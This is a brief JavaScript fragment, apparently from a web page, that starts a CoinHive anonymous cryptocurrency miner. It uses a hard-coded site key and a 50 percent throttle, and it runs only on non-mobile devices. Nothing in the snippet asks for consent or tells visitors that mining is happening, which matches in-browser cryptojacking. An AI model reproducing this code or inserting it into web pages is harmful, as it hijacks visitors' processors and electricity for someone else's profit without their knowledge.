     var miner = new CoinHive.Anonymous('EkKUkZd66bdBQqcXZS1f2jPZnJPjju3O', {
         throttle: 0.5
     });
     if (!miner.isMobile()) {
         miner.start();
     }